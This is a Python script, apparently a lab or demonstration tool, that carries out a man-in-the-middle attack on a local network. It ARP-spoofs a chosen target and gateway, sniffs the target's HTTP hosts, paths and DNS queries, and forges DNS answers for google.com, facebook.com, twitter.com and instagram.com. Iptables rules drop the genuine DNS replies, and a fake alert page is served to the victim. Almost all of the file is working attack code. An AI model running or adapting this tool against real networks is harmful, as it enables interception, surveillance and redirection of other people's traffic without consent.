#!/usr/bin/env python3
import sys
import time
import threading
import argparse
import logging
import signal
from scapy.all import *
from http.server import HTTPServer, BaseHTTPRequestHandler

# Configure detailed logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Global flag for stopping threads
STOP_FLAG = False
SPOOFED_DOMAINS = ["google.com", "facebook.com", "twitter.com", "instagram.com"] # Default targets
REDIRECT_IP = None # Will be set to local IP

# ═══════════════════════════════════════════════════════════════════════════════
#  HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

def enable_ip_forwarding():
    """Enable IP forwarding to allow traffic to flow through this machine."""
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        logger.info("✅ IP Forwarding enabled.")
    except Exception as e:
        logger.error(f"❌ Failed to enable IP forwarding: {e}")

def get_mac(ip, interface):
    """Get MAC address of a target IP using ARP request."""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=interface, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    return None

def restore_arp(target_ip, gateway_ip, interface):
    """Restore ARP tables for target and gateway."""
    target_mac = get_mac(target_ip, interface)
    gateway_mac = get_mac(gateway_ip, interface)
    
    if target_mac and gateway_mac:
        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5, verbose=False)
        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5, verbose=False)
        logger.info("🔄 ARP tables restored.")

# ═══════════════════════════════════════════════════════════════════════════════
#  ATTACK MODULES
# ═══════════════════════════════════════════════════════════════════════════════

def arp_spoof_loop(target_ip, gateway_ip, interface):
    """
    Constantly sends forged ARP packets to Target and Gateway.
    Target thinks We are Gateway.
    Gateway thinks We are Target.
    """
    target_mac = get_mac(target_ip, interface)
    gateway_mac = get_mac(gateway_ip, interface)

    if not target_mac or not gateway_mac:
        logger.error("❌ Could not resolve MAC addresses for ARP Spoofing.")
        return

    logger.info(f"⚡ ARP Spoofing Initialized: {target_ip} ({target_mac}) <-> {gateway_ip} ({gateway_mac})")

    while not STOP_FLAG:
        try:
            # Tell Target that We (IP=Gateway) have MAC=MyMAC
            send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=False)
            # Tell Gateway that We (IP=Target) have MAC=MyMAC
            send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=False)
            time.sleep(2)
        except Exception as e:
            logger.error(f"ARP Spoof Error: {e}")
            break

def dns_spoofer(pkt):
    """
    Sniffs DNS queries and replies with spoofed IP if domain matches list.
    NOTE: Requires blocking original DNS reply (e.g. via iptables) for 100% success.
    Or we just race (send reply faster).
    """
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0: # DNS Query
        qname = pkt.getlayer(DNS).qd.qname.decode('utf-8')
        
        # Check if query matches any target domain
        # Remove trailing dot for check
        clean_qname = qname.rstrip('.')
        
        should_spoof = any(d in clean_qname for d in SPOOFED_DOMAINS)
        
        if should_spoof:
            logger.info(f"☠️  Spoofing DNS: {clean_qname} -> {REDIRECT_IP}")
            
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=REDIRECT_IP))
            
            send(spoofed_pkt, verbose=False)

def traffic_logger(pkt):
    """
    Logs HTTP Host headers and DNS queries.
    """
    if pkt.haslayer(HTTPRequest):
        host = pkt[HTTPRequest].Host.decode('utf-8', errors='ignore')
        path = pkt[HTTPRequest].Path.decode('utf-8', errors='ignore')
        logger.info(f"🕵️  HTTP Sniff: {host}{path}")

    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        qname = pkt.getlayer(DNS).qd.qname.decode('utf-8', errors='ignore')
        logger.info(f"🔍 DNS Query: {qname}")

# ═══════════════════════════════════════════════════════════════════════════════
#  FAKE WEB SERVER (PRANK)
# ═══════════════════════════════════════════════════════════════════════════════

class FakeHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        html = """
        <html>
        <head><title>SECURITY ALERT</title></head>
        <body style="background:black;color:red;text-align:center;font-family:monospace;padding-top:100px;">
            <h1 style="font-size:50px;">⚠️ ACCESS DENIED ⚠️</h1>
            <h2>Your connection has been intercepted by Sentinel Lab.</h2>
            <p>This is a security demonstration.</p>
            <p>Your IP: <b>%s</b></p>
        </body>
        </html>
        """ % self.client_address[0]
        self.wfile.write(html.encode())
    
    def log_message(self, format, *args):
        return # Suppress default logging

def start_fake_server(port=80):
    try:
        server = HTTPServer(('0.0.0.0', port), FakeHandler)
        logger.info(f"🎭 Fake Web Server running on port {port}")
        server.serve_forever()
    except Exception as e:
        logger.error(f"❌ Fake Server Error: {e}")

# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN ENTRY
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    global STOP_FLAG, REDIRECT_IP, SPOOFED_DOMAINS
    
    parser = argparse.ArgumentParser(description="Sentinel Lab MITM Agent")
    parser.add_argument("--interface", required=True, help="Network interface")
    parser.add_argument("--target", required=True, help="Target IP")
    parser.add_argument("--gateway", required=True, help="Gateway IP")
    parser.add_argument("--mode", default="all", help="Attack mode: all, arp, dns, sniff")
    parser.add_argument("--spoof-domains", help="Comma-separated domains to spoof")
    
    args = parser.parse_args()
    
    # Get local IP
    try:
        REDIRECT_IP = get_if_addr(args.interface)
    except:
        REDIRECT_IP = "127.0.0.1" # Fallback

    if args.spoof_domains:
        SPOOFED_DOMAINS = args.spoof_domains.split(",")

    enable_ip_forwarding()

    # Block Forwarding of UDP 53 to win the race (DNS Spoofing)
    # This ensures only our spoofed response reaches the target, NOT the real one.
    if args.mode in ["all", "dns"]:
        logger.info("🛡️  Setting iptables rule to DROP forwarded DNS queries from target...")
        os.system(f"iptables -I FORWARD -p udp --source {args.target} --dport 53 -j DROP")
        os.system(f"iptables -I FORWARD -p udp --destination {args.target} --sport 53 -j DROP")

    threads = []

    # 1. ARP Spoofing
    if args.mode in ["all", "arp", "dns", "sniff"]: # Sniff/DNS require MITM
        t_arp = threading.Thread(target=arp_spoof_loop, args=(args.target, args.gateway, args.interface))
        t_arp.daemon = True
        t_arp.start()
        threads.append(t_arp)

    # 2. Sniffer & DNS Spoofing
    if args.mode in ["all", "dns", "sniff"]:
        # Filter: Traffic from Target
        # Note: scapy sniff blocks, so we run it in thread?
        # But we need to process packets.
        
        def processing_loop():
            # Filter explanation:
            # We want packets FROM target or TO target.
            bpf_filter = f"host {args.target}"
            
            def packet_callback(pkt):
                if args.mode in ["all", "sniff"]:
                    traffic_logger(pkt)
                if args.mode in ["all", "dns"]:
                    dns_spoofer(pkt)

            logger.info("👂 Sniffer started...")
            sniff(filter=bpf_filter, prn=packet_callback, store=0, iface=args.interface)
        
        t_sniff = threading.Thread(target=processing_loop)
        t_sniff.daemon = True
        t_sniff.start()
        threads.append(t_sniff)

    # 3. Fake Server
    if args.mode in ["all", "dns"]:
        t_server = threading.Thread(target=start_fake_server)
        t_server.daemon = True
        t_server.start()
        threads.append(t_server)

    logger.info(f"🚀 Attack Started. Press Ctrl+C to stop.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("🛑 Stopping attack...")
        STOP_FLAG = True
        
        # Restore ARP
        if args.mode in ["all", "arp", "dns", "sniff"]:
            restore_arp(args.target, args.gateway, args.interface)
            
        # Cleanup iptables
        if args.mode in ["all", "dns"]:
            os.system(f"iptables -D FORWARD -p udp --source {args.target} --dport 53 -j DROP")
            os.system(f"iptables -D FORWARD -p udp --destination {args.target} --sport 53 -j DROP")
            logger.info("🧹 Iptables rules cleaned.")

if __name__ == "__main__":
    main()
